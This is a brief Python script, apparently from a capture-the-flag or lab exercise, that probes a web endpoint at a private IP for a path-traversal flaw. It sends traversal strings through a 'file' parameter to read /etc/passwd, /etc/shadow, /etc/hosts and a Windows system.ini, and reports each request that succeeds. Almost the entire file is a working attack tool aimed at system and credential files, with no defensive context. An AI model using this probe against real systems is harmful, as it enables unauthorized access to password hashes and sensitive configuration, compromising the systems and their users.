import requests

# Set the URL and parameter to test
url = "http://10.10.146.174/assets"
parameter = "file"

# Set the list of filenames to test
filenames = [
    "../../../etc/passwd",
    "../../../etc/shadow",
    "../../../etc/hosts",
    "../../../windows/system.ini",
]

# Loop through the filenames and send a request for each one
for filename in filenames:
    payload = {parameter: filename}
    r = requests.get(url, params=payload)
    
    # If the request is successful (HTTP status code 200), print the URL and filename
    if r.status_code == 200:
        print(f"Success: {r.url}")
